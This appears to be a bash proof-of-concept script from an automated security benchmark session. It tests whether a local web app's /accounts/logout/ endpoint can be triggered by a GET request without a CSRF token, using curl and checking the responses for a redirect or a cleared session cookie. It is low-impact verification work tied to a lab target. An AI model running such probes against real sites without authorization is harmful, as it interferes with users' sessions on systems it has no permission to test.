#!/bin/bash
# POC: Demonstrates CSRF logout vulnerability via GET request without CSRF token
# Target: ./repo
# Created: 2025-11-04T19:53:35.779Z
# Session: benchmark-XBEN-025-24-mhkywaac

# CSRF Logout Vulnerability POC
# This script demonstrates that the /accounts/logout/ endpoint can be accessed via GET request
# without requiring a CSRF token, allowing an attacker to force logout any authenticated user

TARGET="http://localhost"
COOKIES_FILE="/tmp/csrf_logout_cookies.txt"

echo "[*] CSRF Logout Vulnerability POC"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Create a cookie jar to store session
echo "[+] Step 1: Creating authenticated session..."
# Note: This POC assumes an authenticated user session is available
# For testing purposes, we'll attempt to access the logout endpoint

# Step 2: Test GET request to logout endpoint (vulnerable)
echo "[+] Step 2: Attempting logout via GET request (no CSRF token)..."
echo "[*] Executing: curl -i '$TARGET/accounts/logout/'"
echo ""

RESPONSE=$(curl -s -i "$TARGET/accounts/logout/" 2>&1)

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Step 3: Check if logout was successful (302 redirect)
if echo "$RESPONSE" | grep -q "302 Found"; then
    echo "[+] VULNERABLE: GET request to /accounts/logout/ returned 302 redirect"
    echo "[+] Session cookie was cleared (logout executed)"
    
    if echo "$RESPONSE" | grep -q "sessionid=\"\""; then
        echo "[+] CONFIRMED: Session cookie cleared (sessionid=\"\")"
        echo "[!] CSRF Protection Bypass: No CSRF token required for logout"
        exit 0
    fi
fi

# Step 4: Verify POST request without token is blocked (for comparison)
echo ""
echo "[+] Step 3: Comparing with POST request without CSRF token..."
echo "[*] Executing: curl -i -X POST '$TARGET/accounts/logout/'"
echo ""

POST_RESPONSE=$(curl -s -i -X POST "$TARGET/accounts/logout/" 2>&1)
echo "[*] POST Response received:"
echo "$POST_RESPONSE"
echo ""

# Step 5: Check if POST is protected with CSRF
if echo "$POST_RESPONSE" | grep -q "403"; then
    echo "[+] CONFIRMED: POST requests ARE protected (403 Forbidden)"
    echo "[!] Asymmetric CSRF Protection: GET allowed, POST blocked"
    exit 0
elif echo "$POST_RESPONSE" | grep -q "302"; then
    echo "[!] WARNING: POST request also results in 302 - need CSRF token"
    exit 1
fi

echo "[!] Could not definitively confirm vulnerability"
exit 1